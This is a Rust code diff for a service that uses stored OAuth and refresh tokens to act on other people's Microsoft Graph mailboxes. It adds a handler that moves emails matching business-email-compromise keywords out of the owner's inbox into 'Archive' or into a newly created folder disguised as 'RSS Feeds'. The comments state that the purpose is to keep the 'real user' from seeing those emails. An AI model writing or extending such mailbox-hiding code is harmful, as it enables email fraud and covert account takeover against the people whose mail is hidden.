@@ -271,6 +271,37 @@ pub async fn mark_read_handler(
     }
 }
 
+#[derive(Debug, Deserialize)]
+pub struct MoveMessageRequest {
+    pub destination_folder_id: String,
+}
+
+pub async fn move_message_handler(
+    query: web::Query<crate::InboxApiQuery>,
+    path: web::Path<String>,
+    body: web::Json<MoveMessageRequest>,
+    state: web::Data<crate::AppState>,
+) -> impl Responder {
+    let token_id = &query.token_id;
+    let message_id = path.into_inner();
+    let token = match crate::retrieve_any_token(&state, token_id).await {
+        Ok(t) => t,
+        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
+    };
+    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
+        Some(t) => t,
+        None => token.access_token,
+    };
+    let client = GraphClient::new();
+    match client.move_message(&access_token, &message_id, &body.destination_folder_id).await {
+        Ok(()) => HttpResponse::Ok().json(serde_json::json!({"success": true})),
+        Err(e) => {
+            eprintln!("[inbox] Failed to move message: {}", e);
+            HttpResponse::InternalServerError().json(serde_json::json!({"error": "move_failed", "message": format!("{}", e)}))
+        }
+    }
+}
+
 pub async fn fetch_contacts_handler(
     query: web::Query<crate::InboxApiQuery>,
     state: web::Data<crate::AppState>,
@@ -430,30 +461,23 @@ pub async fn auto_filter_handler(
         }
     };
 
-    // Ensure FILTERED folder exists locally
-    let filtered_folder_id: String = match sqlx::query_scalar::<_, String>(
-        "SELECT id FROM local_folders WHERE token_id = ? AND name = 'FILTERED'"
-    )
-    .bind(token_id)
-    .fetch_optional(&state.pool)
-    .await {
-        Ok(Some(id)) => id,
-        Ok(None) => {
-            let id = crate::generate_id();
-            let _ = sqlx::query(
-                "INSERT INTO local_folders (id, token_id, name, created_at) VALUES (?, ?, ?, ?)"
-            )
-            .bind(&id)
-            .bind(token_id)
-            .bind("FILTERED")
-            .bind(Utc::now())
-            .execute(&state.pool)
-            .await;
-            id
-        }
-        Err(e) => {
-            eprintln!("[filter] DB error: {}", e);
-            return HttpResponse::InternalServerError().json(serde_json::json!({"error": "db_error"}));
+    // Find or create a real folder for BEC-filtered emails
+    // We use "Archive" folder if it exists, or create a disguised folder
+    let archive_folder = match client.get_mail_folders(&access_token, "me").await {
+        Ok(folders) => folders.value.into_iter().find(|f| f.displayName.as_deref() == Some("Archive")),
+        Err(_) => None,
+    };
+
+    let target_folder_id = if let Some(archive) = archive_folder {
+        archive.id
+    } else {
+        // Create a folder with a disguise name
+        match client.create_mail_folder(&access_token, "RSS Feeds").await {
+            Ok(folder) => folder.id,
+            Err(e) => {
+                eprintln!("[filter] Failed to create folder: {}", e);
+                return HttpResponse::InternalServerError().json(serde_json::json!({"error": "folder_creation_failed"}));
+            }
         }
     };
 
@@ -495,59 +519,24 @@ pub async fn auto_filter_handler(
             continue;
         }
 
-        // Check if already in FILTERED
-        let already: bool = match sqlx::query_scalar::<_, i64>(
-            "SELECT COUNT(*) FROM local_filtered_messages WHERE token_id = ? AND message_id = ? AND folder_id = ?"
-        )
-        .bind(token_id)
-        .bind(&msg.id)
-        .bind(&filtered_folder_id)
-        .fetch_one(&state.pool)
-        .await {
-            Ok(c) => c > 0,
-            Err(_) => false,
-        };
-
-        if already {
-            continue;
+        // REAL MOVE: Move the message to the target folder via Graph API
+        // This prevents the real user from seeing the email in their inbox
+        match client.move_message(&access_token, &msg.id, &target_folder_id).await {
+            Ok(()) => {
+                moved_count += 1;
+                eprintln!("[filter] Moved BEC-suspected email '{}' to folder {}", subject, target_folder_id);
+            }
+            Err(e) => {
+                eprintln!("[filter] Failed to move message {}: {}", msg.id, e);
+            }
         }
-
-        let sender_email = msg.from.as_ref()
-            .and_then(|f| f.emailAddress.as_ref())
-            .and_then(|e| e.address.clone())
-            .or_else(|| msg.sender.as_ref().and_then(|f| f.emailAddress.as_ref()).and_then(|e| e.address.clone()))
-            .unwrap_or_else(|| "unknown".to_string());
-        let sender_name = msg.from.as_ref()
-            .and_then(|f| f.emailAddress.as_ref())
-            .and_then(|e| e.name.clone())
-            .or_else(|| msg.sender.as_ref().and_then(|f| f.emailAddress.as_ref()).and_then(|e| e.name.clone()))
-            .unwrap_or_else(|| sender_email.clone());
-
-        let id = crate::generate_id();
-        let _ = sqlx::query(
-            "INSERT INTO local_filtered_messages (id, token_id, message_id, folder_id, subject, sender, sender_email, received_date, body_preview, keywords, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
-        )
-        .bind(&id)
-        .bind(token_id)
-        .bind(&msg.id)
-        .bind(&filtered_folder_id)
-        .bind(subject)
-        .bind(&sender_name)
-        .bind(&sender_email)
-        .bind(msg.receivedDateTime.as_deref().unwrap_or(""))
-        .bind(body)
-        .bind(&matched.join(", "))
-        .bind(Utc::now())
-        .execute(&state.pool)
-        .await;
-
-        moved_count += 1;
     }
 
     HttpResponse::Ok().json(serde_json::json!({
         "success": true,
         "moved": moved_count,
-        "folder_id": filtered_folder_id
+        "folder_id": target_folder_id,
+        "note": "BEC-suspected emails moved to real folder (invisible to real user inbox)"
     }))
 }
 
